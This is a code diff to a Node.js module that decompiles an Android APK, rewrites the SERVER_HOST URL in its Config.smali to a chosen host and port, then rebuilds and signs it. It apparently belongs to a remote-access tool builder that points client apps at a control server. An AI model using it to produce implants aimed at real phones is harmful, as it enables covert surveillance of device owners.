@@ -1,7 +1,12 @@
 const
     cp = require('child_process'),
     fs = require('fs'),
+    path = require('path'),
     config = require('./config');
+
+function escapeRegExp(str) {
+    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+}
 
 // Java version check for uber-apk-signer compatibility (Java 8+ supported, Java 17+ recommended)
 function javaversion(callback) {
@@ -35,36 +40,139 @@ function javaversion(callback) {
     });
 }
 
+function findConfigSmaliPath() {
+    const bases = ['smali'];
+    for (let i = 2; i <= 5; i++) bases.push(`smali_classes${i}`);
+    for (const base of bases) {
+        const p = path.join(config.smaliPath, base, config.smaliClassRelative);
+        if (fs.existsSync(p)) {
+            try { writeProgress({ step: 'locate', message: 'Config.smali located', complete: true }); } catch (e) {}
+            return p;
+        }
+    }
+    return null;
+}
+
 function patchAPK(URI, PORT, cb) {
     if (PORT < 25565) {
-        fs.readFile(config.patchFilePath, 'utf8', function (err, data) {
-            if (err) return cb('File Patch Error - READ')
-            var result = data.replace(data.substring(data.indexOf("http://"), data.indexOf("?model=")), "http://" + URI + ":" + PORT);
-            fs.writeFile(config.patchFilePath, result, 'utf8', function (err) {
-                if (err) return cb('File Patch Error - WRITE')
-                else return cb(false)
+        // Ensure we have fresh decompiled sources before patching
+        decompileRawApk(function (derr) {
+            if (derr) return cb(derr);
+
+            const targetSmali = findConfigSmaliPath();
+            if (!targetSmali) return cb('Config.smali not found under smali folders');
+
+            try { writeProgress({ step: 'patch', message: 'Patching SERVER_HOST', complete: false }); } catch (e) {}
+            fs.readFile(targetSmali, 'utf8', function (err, data) {
+                if (err) return cb('File Patch Error - READ');
+
+                const newUrl = `http://${URI}:${PORT}`;
+
+                const fieldInitRegex = /(\.field\s+[^\n]*\bSERVER_HOST:Ljava\/lang\/String;[^\n]*=\s*")(https?:\/\/[^"\r\n]+)(")/;
+                const match = data.match(fieldInitRegex);
+                if (!match) return cb('Existing SERVER_HOST definition not found in smali');
+
+                const currentUrl = match[2];
+                const urlPattern = new RegExp(escapeRegExp(currentUrl), 'g');
+                const occurrences = (data.match(urlPattern) || []).length;
+
+                if (!occurrences) return cb('SERVER_HOST URL not detected for replacement');
+
+                if (currentUrl === newUrl) {
+                    try { writeProgress({ step: 'patch', message: 'SERVER_HOST already set', complete: true }); } catch (e) {}
+                    return cb(false);
+                }
+
+                const updated = data.replace(urlPattern, newUrl);
+
+                if (updated === data) {
+                    try { writeProgress({ step: 'patch', message: 'SERVER_HOST already set', complete: true }); } catch (e) {}
+                    return cb(false);
+                }
+
+                fs.writeFile(targetSmali, updated, 'utf8', function (werr) {
+                    if (werr) return cb('File Patch Error - WRITE');
+                    try { writeProgress({ step: 'patch', message: `Patch applied (${occurrences} occurrence${occurrences === 1 ? '' : 's'})`, complete: true }); } catch (e) {}
+                    return cb(false);
+                });
             });
         });
     }
 }
 
+function cleanDecompiledDir(dirPath) {
+    try {
+        if (fs.existsSync(dirPath)) {
+            fs.rmSync(dirPath, { recursive: true, force: true });
+        }
+        // ensure the directory exists after cleanup (apktool will create, but be safe)
+        fs.mkdirSync(dirPath, { recursive: true });
+        try { writeProgress({ step: 'clean', message: 'Decompiled folder cleaned', complete: true }); } catch (e) {}
+        return null;
+    } catch (e) {
+        return e;
+    }
+}
+
+function decompileRawApk(cb) {
+    const err = cleanDecompiledDir(config.smaliPath);
+    if (err) return cb('Failed to clean decompiled folder - ' + err.message);
+
+    if (!fs.existsSync(config.rawApkPath)) {
+        return cb('Raw APK not found at ' + config.rawApkPath + ' - please place compiled app-debug.apk there.');
+    }
+
+    // apktool d "raw.apk" -o "decompiled" -f
+    const decompileCmd = `java -jar "${config.apkTool}" d "${config.rawApkPath}" -o "${config.smaliPath}" -f`;
+    try { writeProgress({ step: 'decompile', message: 'Decompiling raw APK', complete: false }); } catch (e) {}
+    cp.exec(decompileCmd, (error, stdout, stderr) => {
+        if (error) return cb('Decompile Command Failed - ' + error.message);
+        try { writeProgress({ step: 'decompile', message: 'Decompile completed', complete: true }); } catch (e) {}
+        return cb(false);
+    });
+}
+
 function buildAPK(cb) {
     javaversion(function (err, version) {
-        if (!err) cp.exec(config.buildCommand, (error, stdout, stderr) => {
-            if (error) return cb('Build Command Failed - ' + error.message);
-            else cp.exec(config.signCommand, (error, stdout, stderr) => {
-                if (!error) {
-                    // Copy the signed APK to the download location
-                    const downloadApkPath = config.apkBuildPath.replace('build.apk', 'build.s.apk');
-                    fs.copyFile(config.apkBuildPath, downloadApkPath, (copyError) => {
-                        if (copyError) return cb('Failed to copy signed APK - ' + copyError.message);
-                        return cb(false);
-                    });
-                } else return cb('Sign Command Failed - ' + error.message);
+        try { writeProgress({ step: 'java', message: err ? String(err) : 'Java detected', complete: !err }); } catch (e) {}
+        if (!err) {
+            // Build from already decompiled-and-patched folder
+            try { writeProgress({ step: 'build', message: 'Building APK', complete: false }); } catch (e) {}
+            cp.exec(config.buildCommand, (error, stdout, stderr) => {
+                if (error) return cb('Build Command Failed - ' + error.message);
+                try { writeProgress({ step: 'build', message: 'Build completed', complete: true }); } catch (e) {}
+                // Sign apk
+                try { writeProgress({ step: 'sign', message: 'Signing APK', complete: false }); } catch (e) {}
+                cp.exec(config.signCommand, (sErr, sOut, sErrOut) => {
+                    if (!sErr) {
+                        // Copy the signed APK to the download location
+                        const downloadApkPath = config.apkBuildPath.replace('build.apk', 'build.s.apk');
+                        fs.copyFile(config.apkBuildPath, downloadApkPath, (copyError) => {
+                            if (copyError) return cb('Failed to copy signed APK - ' + copyError.message);
+                            const cleanupErr = cleanDecompiledDir(config.smaliPath);
+                            if (cleanupErr) {
+                                try { writeProgress({ step: 'clean', message: 'Cleanup failed - ' + cleanupErr.message, complete: false }); } catch (e) {}
+                                return cb('Build succeeded but failed to clean decompiled folder - ' + cleanupErr.message);
+                            }
+                            try { writeProgress({ step: 'clean', message: 'Decompiled folder cleaned', complete: true }); } catch (e) {}
+                            try { writeProgress({ step: 'finalize', message: 'Build succeeded', complete: true }); } catch (e) {}
+                            return cb(false);
+                        });
+                    } else return cb('Sign Command Failed - ' + sErr.message);
+                });
             });
-        });
+        }
         else return cb(err);
     })
+}
+
+function writeProgress(data) {
+    try {
+        const payload = Object.assign({ time: new Date().toISOString() }, data || {});
+        fs.writeFileSync(config.buildProgressFile, JSON.stringify(payload));
+    } catch (e) {
+        // ignore progress write errors
+    }
 }
 
 module.exports = {
